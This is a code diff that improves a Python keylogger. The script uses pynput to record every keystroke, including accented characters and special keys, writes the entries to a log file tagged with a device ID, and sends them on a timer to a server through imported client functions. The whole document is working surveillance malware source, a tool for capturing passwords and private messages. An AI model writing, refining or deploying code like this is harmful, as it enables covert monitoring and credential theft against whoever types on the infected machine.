@@ -1,9 +1,16 @@
+# -*- coding: utf-8 -*-
+"""
+Keylogger with Proper UTF-8 Encoding and Special Key Support
+Simplified version without Ctrl/Alt tracking
+"""
+
 # Import required modules
 import os
 import time
 import socket
 import platform
 import threading
+import sys
 from pynput import keyboard
 from client import send_logs, get_log_file, get_config_from_server, get_send_interval
 
@@ -30,43 +37,60 @@ def get_device_id():
 
 device_id = get_device_id()
 
-# Write to log file
+# Write to log file with proper UTF-8 encoding
 def write_log(message):
-    """Write a log entry to file"""
+    """Write a log entry to file with proper UTF-8 encoding"""
     timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-    log_entry = f'["{device_id}", "{timestamp}", {message}]\n'
+    
+    # Escape special JSON characters in the message
+    message_escaped = message.replace('\\', '\\\\').replace('"', '\\"')
+    
+    # Create log entry in proper JSON-like format
+    log_entry = f'["{device_id}", "{timestamp}", "{message_escaped}"]\n'
     
     try:
-        with open(log_file, 'a', encoding='utf-8') as f:
+        # Write with explicit UTF-8 encoding
+        with open(log_file, 'a', encoding='utf-8', errors='replace') as f:
             f.write(log_entry)
     except Exception as e:
         print(f"Error writing log: {e}")
 
 # Init log file
-write_log('"=== Session Started ==="')
+write_log("=== Session Started ===")
 
-# Map virtual key codes to characters 
-def vk_to_char(vk):
-    """Convert vk code to character"""
-    vk_number_map = {
-        0x30: '0', 0x31: '1', 0x32: '2', 0x33: '3', 0x34: '4',
-        0x35: '5', 0x36: '6', 0x37: '7', 0x38: '8', 0x39: '9'
+# Get special key name
+def get_special_key_name(key):
+    """Convert special keys to readable format"""
+    special_keys = {
+        keyboard.Key.enter: '[ENTER]',
+        keyboard.Key.tab: '[TAB]',
+        keyboard.Key.delete: '[DELETE]',
+        keyboard.Key.esc: '[ESC]',
+        keyboard.Key.up: '[UP]',
+        keyboard.Key.down: '[DOWN]',
+        keyboard.Key.left: '[LEFT]',
+        keyboard.Key.right: '[RIGHT]',
+        keyboard.Key.home: '[HOME]',
+        keyboard.Key.end: '[END]',
+        keyboard.Key.page_up: '[PAGE_UP]',
+        keyboard.Key.page_down: '[PAGE_DOWN]',
+        keyboard.Key.insert: '[INSERT]',
+        keyboard.Key.caps_lock: '[CAPS_LOCK]',
+        keyboard.Key.print_screen: '[PRINT_SCREEN]',
+        keyboard.Key.scroll_lock: '[SCROLL_LOCK]',
+        keyboard.Key.pause: '[PAUSE]',
+        keyboard.Key.menu: '[MENU]',
     }
     
-    vk_numpad_map = {
-        0x60: '0', 0x61: '1', 0x62: '2', 0x63: '3', 0x64: '4',
-        0x65: '5', 0x66: '6', 0x67: '7', 0x68: '8', 0x69: '9'
-    }
+    # Handle F1-F12 keys
+    for i in range(1, 13):
+        try:
+            f_key = getattr(keyboard.Key, f'f{i}')
+            special_keys[f_key] = f'[F{i}]'
+        except:
+            pass
     
-    if vk in vk_number_map:
-        return vk_number_map[vk]
-    elif vk in vk_numpad_map:
-        return vk_numpad_map[vk]
-    
-    if 0x41 <= vk <= 0x5A:
-        return chr(vk).lower()
-    
-    return None
+    return special_keys.get(key, None)
 
 # Timer to send logs
 def auto_send_logs():
@@ -82,42 +106,74 @@ def auto_send_logs():
             success = send_logs()
             
             if success:
-                write_log('"=== New Session ==="')
+                write_log("=== New Session ===")
 
 # Event - key pressed
 def on_press(key):
     global current_sentence
     
-    if hasattr(key, 'char') and key.char is not None:
-        current_sentence += key.char
-    elif hasattr(key, 'vk') and key.vk is not None:
-        char = vk_to_char(key.vk)
-        if char:
-            current_sentence += char
-    else:
+    try:
+        # Handle Space
         if key == keyboard.Key.space:
             current_sentence += " "
-        elif key == keyboard.Key.enter:
-            if current_sentence:
-                write_log(f'"{current_sentence}"')
+            return
+        
+        # Handle Enter - save current sentence
+        if key == keyboard.Key.enter:
+            current_sentence += "[ENTER]"
+            if current_sentence.strip():
+                write_log(current_sentence)
                 current_sentence = ""
-        elif key == keyboard.Key.backspace:
+            return
+        
+        # Handle Backspace
+        if key == keyboard.Key.backspace:
             if len(current_sentence) > 0:
                 current_sentence = current_sentence[:-1]
-        elif key == keyboard.Key.tab:
-            current_sentence += "\t"
+            else:
+                current_sentence += "[BACKSPACE]"
+            return
+        
+        # Handle regular characters (including special characters like é, è, ç, à, etc.)
+        if hasattr(key, 'char') and key.char is not None:
+            # Get the character
+            char = key.char
+            
+            # Check if it's a printable character
+            char_code = ord(char)
+            
+            # Ignore control characters (0-31) except tab
+            if char_code < 32 and char_code != 9:
+                return
+            
+            # Add the character - Python 3 handles UTF-8 natively
+            current_sentence += char
+            return
+        
+        # Handle other special keys (but ignore modifier keys like Ctrl, Alt, Shift)
+        if key not in [keyboard.Key.ctrl, keyboard.Key.ctrl_r, 
+                       keyboard.Key.alt, keyboard.Key.alt_r,
+                       keyboard.Key.shift, keyboard.Key.shift_r,
+                       keyboard.Key.cmd, keyboard.Key.cmd_r]:
+            special_key = get_special_key_name(key)
+            if special_key:
+                current_sentence += special_key
+            
+    except Exception as e:
+        print(f"Error processing key press: {e}")
 
 # Event - key released
 def on_release(key):
     global listener_active, current_sentence
     
+    # Handle ESC to stop
     if key == keyboard.Key.esc:
         print("\n[ESC pressed] Stopping keylogger...")
         
-        if current_sentence:
-            write_log(f'"{current_sentence}"')
+        if current_sentence.strip():
+            write_log(current_sentence)
         
-        write_log('"=== Session Ended (Manual Stop) ==="')
+        write_log("=== Session Ended (Manual Stop) ===")
         
         listener_active = False
         
@@ -145,7 +201,7 @@ try:
 except KeyboardInterrupt:
     print("\n[Interrupted] Stopping keylogger...")
     listener_active = False
-    write_log('"=== Session Ended (Interrupted) ==="')
+    write_log("=== Session Ended (Interrupted) ===")
     send_logs()
 
 print("Keylogger stopped.")
